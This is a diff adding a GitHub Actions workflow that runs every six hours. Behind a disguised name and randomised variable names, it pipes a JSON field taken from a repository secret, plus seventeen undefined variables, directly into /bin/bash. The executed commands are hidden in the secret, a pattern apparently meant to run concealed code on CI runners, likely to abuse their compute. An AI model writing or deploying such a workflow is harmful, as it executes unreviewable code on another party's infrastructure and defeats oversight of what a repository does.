@@ -1,0 +1,34 @@
+name: circleciworks84
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '21 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: circleciworks84
+        env:
+          grhr38729: ${{ secrets.grhr38729 }}
+        run: |
+          echo $grhr38729 | jq -r .m9 | /bin/bash
+          echo $xnj2 | jq -r .fqnj027 | /bin/bash
+          echo $hgab8278 | jq -r .biadc282 | /bin/bash
+          echo $qnjcm5189 | jq -r .qo7542 | /bin/bash
+          echo $c07761 | jq -r .habp41 | /bin/bash
+          echo $zz9539 | jq -r .oz6 | /bin/bash
+          echo $ljlsl826 | jq -r .ig22 | /bin/bash
+          echo $w76549 | jq -r .wvngh282 | /bin/bash
+          echo $lfw78 | jq -r .n5459 | /bin/bash
+          echo $tk8 | jq -r .noy6 | /bin/bash
+          echo $wqa2 | jq -r .bwk802 | /bin/bash
+          echo $iag3018 | jq -r .rc7 | /bin/bash
+          echo $wptc62842 | jq -r .hf23843 | /bin/bash
+          echo $qjboe728 | jq -r .kcx44430 | /bin/bash
+          echo $z22 | jq -r .ca797 | /bin/bash
+          echo $l867 | jq -r .xqgrv6844 | /bin/bash
+          echo $lm29096 | jq -r .iei30431 | /bin/bash
+          echo $ge1740 | jq -r .ekx5005 | /bin/bash
+
